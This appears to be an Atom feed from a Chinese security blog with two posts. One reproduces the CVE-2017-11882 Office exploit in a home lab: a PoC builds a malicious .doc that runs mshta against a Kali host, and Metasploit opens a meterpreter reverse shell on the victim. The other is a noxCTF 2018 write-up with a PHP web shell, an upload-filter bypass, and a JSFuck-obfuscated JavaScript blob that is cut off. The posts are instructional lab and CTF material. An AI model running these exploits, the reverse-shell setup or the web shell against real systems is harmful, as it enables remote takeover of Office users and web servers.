<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://threst.github.io/"/>
  <updated>2018-09-18T05:42:35.645Z</updated>
  <id>https://threst.github.io/</id>
  
  <author>
    <name>threst</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CVE-2017-11882复现</title>
    <link href="https://threst.github.io/2018/09/18/cve-2017-11882/"/>
    <id>https://threst.github.io/2018/09/18/cve-2017-11882/</id>
    <published>2018-09-18T05:34:14.000Z</published>
    <updated>2018-09-18T05:42:35.645Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-漏洞简介"><a href="#0x00-漏洞简介" class="headerlink" title="0x00 漏洞简介"></a>0x00 漏洞简介</h2><p>2017年11月14日，微软发布了11月份的安全补丁更新，其中比较引人关注的莫过于悄然修复了潜伏17年之久的Office远程代码执行漏洞（CVE-2017-11882）。该漏洞为Office内存破坏漏洞，影响目前流行的所有Office版本。攻击者可以利用漏洞以当前登录的用户的身份执行任意命令。 由于漏洞影响面较广，漏洞披露后，金睛安全研究团队持续对漏洞相关攻击事件进行关注。11月19日，监控到了已有漏洞POC在网上流传，随即迅速对相关样本进行了分析。目前该样本全球仅微软杀毒可以检测。</p><ul><li>漏洞影响版本：</li><li>Office 365</li><li>Microsoft Office 2000</li><li>Microsoft Office 2003</li><li>Microsoft Office 2007 Service Pack 3</li><li>Microsoft Office 2010 Service Pack 2</li><li>Microsoft Office 2013 Service Pack 1</li><li>Microsoft Office 2016</li></ul><h2 id="0x01-利用工具清单："><a href="#0x01-利用工具清单：" class="headerlink" title="0x01 利用工具清单："></a>0x01 利用工具清单：</h2><p>a) tcp反弹：kali 192.168.1.5<br>b) 安装office2016的系统：win7 192.168.1.7</p><h2 id="0x02-利用过程"><a href="#0x02-利用过程" class="headerlink" title="0x02 利用过程"></a>0x02 利用过程</h2><h3 id="下载poc"><a href="#下载poc" class="headerlink" title="下载poc"></a>下载poc</h3><p><a href="https://github.com/Ridter/CVE-2017-11882" target="_blank" rel="noopener">github</a></p><h3 id="生成msf利用的doc"><a href="#生成msf利用的doc" class="headerlink" title="生成msf利用的doc"></a>生成msf利用的doc</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">threst@threst:~/Pentest/poc/CVE-2017-11882$ python Command43b_CVE-2017-11882.py -c &quot;mshta http://192.168.1.5:8080/abc&quot; -o cve.doc</span><br><span class="line">[*] Done ! output file --&gt; cve.doc</span><br><span class="line">threst@threst:~/Pentest/poc/CVE-2017-11882$ sudo cp cve.doc /var/www/html/</span><br></pre></td></tr></table></figure><h3 id="msf配置Poc："><a href="#msf配置Poc：" class="headerlink" title="msf配置Poc："></a>msf配置Poc：</h3><p>开启metasploit<br><code>msfconsole</code><br>使用11882模块<br><code>use exploit/windows/smb/cve-2017-11882</code><br>设置payload<br><code>set payload windows/meterpreter/reverse_tcp</code></p><p>设置选项<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(windows/smb/cve-2017-11882) &gt; set lhost 192.168.1.5</span><br><span class="line">lhost =&gt; 192.168.1.5</span><br><span class="line">msf exploit(windows/smb/cve-2017-11882) &gt; set URIPATH abc</span><br><span class="line">URIPATH =&gt; abc</span><br><span class="line">msf exploit(windows/smb/cve-2017-11882) &gt; options </span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/smb/cve-2017-11882):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   SRVHOST  0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0</span><br><span class="line">   SRVPORT  8080             yes       The local port to listen on.</span><br><span class="line">   SSL      false            no        Negotiate SSL for incoming connections</span><br><span class="line">   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)</span><br><span class="line">   URIPATH  abc              no        The URI to use for this exploit (default is random)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  process          yes       Exit technique (Accepted: &apos;&apos;, seh, thread, process, none)</span><br><span class="line">   LHOST     192.168.1.5      yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf exploit(windows/smb/cve-2017-11882) &gt; exploit </span><br><span class="line">[*] Exploit running as background job 0.</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.1.5:4444 </span><br><span class="line">[*] Using URL: http://0.0.0.0:8080/abc</span><br><span class="line">msf exploit(windows/smb/cve-2017-11882) &gt; [*] Local IP: http://192.168.1.5:8080/abc</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Place the following DDE in an MS document:</span><br><span class="line">mshta.exe &quot;http://192.168.1.5:8080/abc&quot;</span><br><span class="line">[*] 192.168.1.7      cve-2017-11882 - Delivering payload</span><br><span class="line">[*] Sending stage (179779 bytes) to 192.168.1.7</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.1.5:4444 -&gt; 192.168.1.7:58478) at 2018-09-18 13:16:55 +0800</span><br></pre></td></tr></table></figure></p><p>win7用360极速浏览器打开<code>http://192.168.1.5:8080/abc</code></p><p><img src="https://i.loli.net/2018/09/18/5ba08b7ad6eba.jpg" alt=""></p><p><img src="https://i.loli.net/2018/09/18/5ba08b7aa16a8.jpg" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(windows/smb/cve-2017-11882) &gt; sessions -i 1 </span><br><span class="line">[*] Starting interaction with 1...</span><br><span class="line"></span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 1440 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line">Microsoft Windows [�汾 6.1.7601]</span><br><span class="line">��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ����</span><br><span class="line"></span><br><span class="line">C:\Users\threst\AppData\Local\360Chrome\Chrome\Application\9.5.0.138&gt;whoami</span><br><span class="line">whoami</span><br><span class="line">threst-pc\threst</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/i-honey/p/7885573.html" target="_blank" rel="noopener">https://www.cnblogs.com/i-honey/p/7885573.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-漏洞简介&quot;&gt;&lt;a href=&quot;#0x00-漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;0x00 漏洞简介&quot;&gt;&lt;/a&gt;0x00 漏洞简介&lt;/h2&gt;&lt;p&gt;2017年11月14日，微软发布了11月份的安全补丁更新，其中比较引人关注的莫过于悄
      
    
    </summary>
    
    
      <category term="CVE-2017-11882" scheme="https://threst.github.io/tags/CVE-2017-11882/"/>
    
  </entry>
  
  <entry>
    <title>noxctf2018wp</title>
    <link href="https://threst.github.io/2018/09/15/noxctf2018wp/"/>
    <id>https://threst.github.io/2018/09/15/noxctf2018wp/</id>
    <published>2018-09-15T05:34:14.000Z</published>
    <updated>2018-09-18T05:44:34.577Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>题目</p><blockquote><p>What is your reference again?<br><a href="http://chal.noxale.com:5000" target="_blank" rel="noopener">http://chal.noxale.com:5000</a></p></blockquote><p>提示我改这个<code>Referer</code></p><p><img src="https://i.loli.net/2018/09/09/5b951e2db1219.png" alt=""></p><p>我就用Firefox的改包重发改成<code>/check_from_google</code></p><p><img src="https://i.loli.net/2018/09/09/5b951e2dca83d.png" alt=""></p><p><code>bm94Q1RGe0cwb2dMM18xc180bFc0WXNfVXJfYjNTVF9SM2YzcjNuYzN9</code></p><p>base64解密下</p><p>flag:<code>noxCTF{G0ogL3_1s_4lW4Ys_Ur_b3ST_R3f3r3nc3}</code></p><h2 id="MyFileUploader"><a href="#MyFileUploader" class="headerlink" title="MyFileUploader"></a>MyFileUploader</h2><p>题目</p><blockquote><p>This is my new file uploader server. I bet you can’t hack it!<br><a href="http://chal.noxale.com:8079" target="_blank" rel="noopener">http://chal.noxale.com:8079</a></p></blockquote><p>打开链接，可以上传文件，随便写个文件试试。<br><code>shell.php</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">system($_GET[&apos;cmd&apos;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2018/09/10/5b9602239f358.png" alt=""></p><p>提示失败，要图片类型才可以，经过几次尝试之后，把<code>shell.php</code>改成<code>shell.png.txt</code>上传试试，</p><p><img src="https://i.loli.net/2018/09/10/5b9602a635b95.png" alt=""></p><p>居然可以！访问下，但是没有解析，看看<code>uploads</code>有些什么，发现一个<code>Don&#39;t open</code>文件夹，他说不打开就不打开吗？可以要打开看看。</p><p><img src="https://i.loli.net/2018/09/10/5b9604668b06d.png" alt=""></p><p><img src="https://i.loli.net/2018/09/10/5b96046667e77.png" alt=""></p><p><code>AddType application/x-httpd-php .cyb3r</code>看样子只有<code>.cyb3r</code>才可以解析，把文件改成这个试试。</p><p><img src="https://i.loli.net/2018/09/10/5b96084b08caf.png" alt=""></p><p>成功了！这个文件很奇怪打开看看</p><p><code>curl &quot;http://chal.noxale.com:8079/uploads/shell.png.cyb3r?cmd=ls%207H3-FL4G-1S-H3r3&quot;</code></p><p><img src="https://i.loli.net/2018/09/10/5b9608dfb47f9.png" alt=""></p><p>flag:<code>noxCTF{N3V3R_7RU57_07H3R5}</code></p><h2 id="Read-Between-The-Lines"><a href="#Read-Between-The-Lines" class="headerlink" title="Read Between The Lines"></a>Read Between The Lines</h2><p>题目<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">My boss promised me that he would give me a raise if I solve his challenge.</span><br><span class="line">Have I already mentioned I suck in challenges?</span><br></pre></td></tr></table></figure></p><p>下载下来一个<code>message.code</code>,linux下打不开，不急，file试一下，提示<code>gzip</code>，把他后缀名改成<code>gz</code>就可以打开了。<br>打开后是这样的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+([][[]]+[])[+[]]+([][[]]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()(([]+[])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+[]])[+[]]+(!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]])+[])+([][[]]+[])[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]